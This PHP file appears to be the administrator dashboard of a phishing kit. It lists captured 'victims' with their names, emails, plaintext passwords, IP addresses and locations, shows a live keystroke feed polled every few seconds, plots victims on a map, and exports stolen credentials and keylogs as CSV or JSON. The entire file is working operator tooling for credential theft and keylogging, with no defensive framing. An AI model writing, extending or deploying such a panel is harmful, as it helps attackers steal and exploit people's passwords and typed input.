<?php
require_once __DIR__ . '/functions.php';
requireAdmin();

$search = trim($_GET['search'] ?? '');
$page = max(1, (int)($_GET['page'] ?? 1));
$perPage = 25;
$offset = ($page - 1) * $perPage;

if (!empty($search)) {
    $like = "%$search%";
    $stmt = $pdo->prepare("SELECT * FROM credentials WHERE name LIKE :s OR email LIKE :s2 OR ip LIKE :s3 OR country LIKE :s4 ORDER BY created_at DESC LIMIT $perPage OFFSET $offset");
    $stmt->execute([':s'=>$like,':s2'=>$like,':s3'=>$like,':s4'=>$like]);
    $credentials = $stmt->fetchAll();
    $totalResults = (int)$pdo->prepare("SELECT COUNT(*) FROM credentials WHERE name LIKE :s OR email LIKE :s2 OR ip LIKE :s3 OR country LIKE :s4")->execute([':s'=>$like,':s2'=>$like,':s3'=>$like,':s4'=>$like])->fetchColumn();
    // redo count properly
    $cstmt = $pdo->prepare("SELECT COUNT(*) FROM credentials WHERE name LIKE :s OR email LIKE :s2 OR ip LIKE :s3 OR country LIKE :s4");
    $cstmt->execute([':s'=>$like,':s2'=>$like,':s3'=>$like,':s4'=>$like]);
    $totalResults = (int)$cstmt->fetchColumn();
} else {
    $stmt = $pdo->prepare("SELECT * FROM credentials ORDER BY created_at DESC LIMIT $perPage OFFSET $offset");
    $stmt->execute();
    $credentials = $stmt->fetchAll();
    $totalResults = (int)$pdo->query("SELECT COUNT(*) FROM credentials")->fetchColumn();
}

$totalPages = max(1, ceil($totalResults / $perPage));
$totalVictims = (int)$pdo->query("SELECT COUNT(*) FROM credentials")->fetchColumn();
$todayCount = (int)$pdo->query("SELECT COUNT(*) FROM credentials WHERE DATE(created_at) = CURDATE()")->fetchColumn();
$uniqueIps = (int)$pdo->query("SELECT COUNT(DISTINCT ip) FROM credentials")->fetchColumn();
$lastCapture = $pdo->query("SELECT MAX(created_at) FROM credentials")->fetchColumn();
$lastCaptureDisplay = $lastCapture ? date('M j, g:i A', strtotime($lastCapture)) : 'No captures yet';
$locations = $pdo->query("SELECT country, city, latitude, longitude FROM credentials WHERE latitude IS NOT NULL AND longitude IS NOT NULL GROUP BY country, city")->fetchAll();

// handle deletes
if (isset($_GET['delete']) && $_GET['delete'] === 'all') { $pdo->exec("TRUNCATE TABLE credentials"); header("Location: admin.php"); exit; }
if (isset($_GET['delete']) && is_numeric($_GET['delete'])) { $pdo->prepare("DELETE FROM credentials WHERE id = :id")->execute([':id'=>(int)$_GET['delete']]); header("Location: admin.php"); exit; }
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Dashboard - Admin Panel</title>
<link rel="stylesheet" href="styles/admin.css">
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
</head>
<body>
<div class="app">
    <aside class="sidebar">
        <div class="sidebar-header">
            <div class="sidebar-logo"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0110 0v4"></path></svg></div>
            <span>Admin</span>
        </div>
        <nav class="sidebar-nav">
            <a href="#" class="nav-link active" data-section="dashboard">Dashboard</a>
            <a href="#" class="nav-link" data-section="victims">Victims</a>
            <a href="#" class="nav-link" data-section="keylog">Keylog Feed</a>
            <a href="#" class="nav-link" data-section="map">Map</a>
        </nav>
        <div class="sidebar-footer"><a href="logout.php" class="nav-link logout-link">Logout</a></div>
    </aside>
    <main class="main-content">
        <header class="top-bar"><h2 id="sectionTitle">Dashboard</h2><div class="top-bar-actions"><span class="last-update">Updated <span id="updateTime">just now</span></span><button class="btn btn-sm btn-ghost" onclick="location.reload()">Refresh</button></div></header>

        <section id="section-dashboard" class="section active">
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value"><?php echo $totalVictims; ?></div><div class="stat-label">Total Victims</div></div>
                <div class="stat-card"><div class="stat-value"><?php echo $todayCount; ?></div><div class="stat-label">Today</div></div>
                <div class="stat-card"><div class="stat-value"><?php echo $uniqueIps; ?></div><div class="stat-label">Unique IPs</div></div>
                <div class="stat-card"><div class="stat-value" id="liveKeysCount">0</div><div class="stat-label">Keystrokes Captured</div></div>
                <div class="stat-card"><div class="stat-value"><?php echo sanitizeOutput($lastCaptureDisplay); ?></div><div class="stat-label">Last Capture</div></div>
            </div>
        </section>

        <section id="section-victims" class="section">
            <div class="section-toolbar">
                <form method="get" class="search-form">
                    <input type="text" name="search" placeholder="Search by name, email, IP, country..." value="<?php echo sanitizeOutput($search); ?>" class="search-input">
                    <button type="submit" class="btn btn-primary btn-sm">Search</button>
                    <?php if (!empty($search)): ?><a href="?" class="btn btn-ghost btn-sm">Clear</a><?php endif; ?>
                </form>
                <div class="export-btns">
                    <a href="export.php?format=csv&type=credentials" class="btn btn-sm btn-success">CSV</a>
                    <a href="export.php?format=json&type=credentials" class="btn btn-sm btn-info">JSON</a>
                    <button class="btn btn-sm btn-danger" onclick="if(confirm('Delete ALL victims?'))window.location.href='?delete=all'">Clear All</button>
                </div>
            </div>
            <div class="table-wrap">
                <table class="data-table">
                    <thead><tr><th>ID</th><th>Name</th><th>Email</th><th>Password</th><th>IP</th><th>Location</th><th>Date</th><th>Actions</th></tr></thead>
                    <tbody>
                        <?php if (empty($credentials)): ?><tr><td colspan="8" class="empty-state">No victims captured yet.</td></tr><?php endif; ?>
                        <?php foreach ($credentials as $row): ?>
                        <tr>
                            <td><?php echo $row['id']; ?></td>
                            <td><?php echo sanitizeOutput($row['name']); ?></td>
                            <td><?php echo sanitizeOutput($row['email']); ?></td>
                            <td><code class="pw-text"><?php echo sanitizeOutput($row['password']); ?></code></td>
                            <td><?php echo sanitizeOutput($row['ip']); ?></td>
                            <td><?php echo sanitizeOutput($row['country'].($row['city']?', '.$row['city']:'')); ?></td>
                            <td class="td-date"><?php echo date('M j, g:i A', strtotime($row['created_at'])); ?></td>
                            <td><a href="?delete=<?php echo $row['id']; ?>" class="btn btn-sm btn-danger" onclick="return confirm('Delete?')">Delete</a></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
            <?php if ($totalPages > 1): ?>
            <div class="pagination">
                <?php for ($i=1;$i<=$totalPages;$i++): ?>
                <a href="?page=<?php echo $i; ?><?php echo !empty($search)?'&search='.urlencode($search):''; ?>" class="page-link <?php echo $i===$page?'active':''; ?>"><?php echo $i; ?></a>
                <?php endfor; ?>
            </div>
            <?php endif; ?>
        </section>

        <section id="section-keylog" class="section">
            <div class="section-toolbar"><h3>Live Keystroke Feed</h3><div class="feed-controls"><span class="feed-status" id="feedStatus">● Live</span><button class="btn btn-sm btn-ghost" onclick="clearFeed()">Clear Feed</button><a href="export.php?format=csv&type=keylogs" class="btn btn-sm btn-success">Export CSV</a></div></div>
            <div class="keylog-feed" id="keylogFeed"><div class="feed-empty">Waiting for keystrokes...</div></div>
        </section>

        <section id="section-map" class="section"><h3>Geolocation Map</h3><div id="mapContainer" style="height:500px;border-radius:8px;margin-top:16px;"></div><?php if(empty($locations)): ?><p class="empty-state" style="margin-top:16px;">No geolocation data available yet.</p><?php endif; ?></section>
    </main>
</div>

<script>
(function(){
    var nav=document.querySelectorAll('.nav-link[data-section]'), sec=document.querySelectorAll('.section'), st=document.getElementById('sectionTitle');
    var feed=document.getElementById('keylogFeed'), lkc=document.getElementById('liveKeysCount'), ut=document.getElementById('updateTime');
    var lastId=0, running=true;

    nav.forEach(function(l){l.addEventListener('click',function(e){
        e.preventDefault();var s=this.getAttribute('data-section');
        nav.forEach(function(x){x.classList.remove('active');});this.classList.add('active');
        sec.forEach(function(x){x.classList.remove('active');});
        document.getElementById('section-'+s).classList.add('active');
        var t={dashboard:'Dashboard',victims:'Victims',keylog:'Keylog Feed',map:'Map'};
        st.textContent=t[s]||'Dashboard';
        if(s==='map')setTimeout(initMap,100);
    });});

    function pollStats(){
        var x=new XMLHttpRequest();
        x.open('GET','get_feed.php?type=stats&t='+Date.now(),true);
        x.onload=function(){if(x.status===200)try{var r=JSON.parse(x.responseText);if(r.status==='ok'&&r.stats){var c=document.querySelectorAll('.stat-card');if(c.length>=5){c[0].querySelector('.stat-value').textContent=r.stats.total_victims;c[1].querySelector('.stat-value').textContent=r.stats.today_count;c[2].querySelector('.stat-value').textContent=r.stats.unique_ips;lkc.textContent=r.stats.total_keystrokes;c[4].querySelector('.stat-value').textContent=r.stats.last_capture;}}}catch(e){}};
        x.send();
    }

    function pollKeylogs(){
        if(!running)return;
        var x=new XMLHttpRequest();
        x.open('GET','get_feed.php?type=keylogs&since='+lastId+'&t='+Date.now(),true);
        x.onload=function(){if(x.status===200)try{var r=JSON.parse(x.responseText);if(r.status==='ok'&&r.data&&r.data.length>0){if(r.max_id>lastId)lastId=r.max_id;var e=feed.querySelector('.feed-empty');if(e)e.remove();r.data.forEach(function(l){var d=document.createElement('div');d.className='feed-entry';var kd='';if(l.keys_display){kd=Object.keys(l.keys_display).map(function(k){return'<span class="key-ctx">'+esc(k)+'</span>: <span class="key-val">'+esc(l.keys_display[k])+'</span>';}).join(' | ');}else{kd='<span class="key-val">'+esc(l.key_data||'')+'</span>';}d.innerHTML='<div class="feed-meta"><span class="feed-email">'+esc(l.email_identifier||'anonymous')+'</span> <span class="feed-context">'+esc(l.field_context)+'</span> <span class="feed-time">'+esc(l.created_at)+'</span></div><div class="feed-data">'+kd+'</div>';feed.insertBefore(d,feed.firstChild);});while(feed.children.length>100)feed.removeChild(feed.lastChild);}}catch(e){}ut.textContent=new Date().toLocaleTimeString();};
        x.send();
    }

    function esc(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;}
    window.clearFeed=function(){feed.innerHTML='<div class="feed-empty">Feed cleared.</div>';};

    var mapInit=false, mapInst=null;
    function initMap(){
        if(mapInit&&mapInst){mapInst.invalidateSize();return;}
        var c=document.getElementById('mapContainer');if(!c)return;
        var locs=<?php echo json_encode($locations); ?>;if(locs.length===0)return;
        mapInst=L.map('mapContainer').setView([20,0],2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'&copy; OpenStreetMap contributors',maxZoom:18}).addTo(mapInst);
        locs.forEach(function(l){if(l.latitude&&l.longitude)L.marker([l.latitude,l.longitude]).addTo(mapInst).bindPopup((l.city||'')+(l.country?', '+l.country:''));});
        mapInit=true;
    }

    pollStats();setTimeout(pollKeylogs,500);
    setInterval(pollStats,10000);setInterval(pollKeylogs,3000);
    if(document.getElementById('section-map').classList.contains('active'))setTimeout(initMap,500);
})();
</script>
</body>
</html>
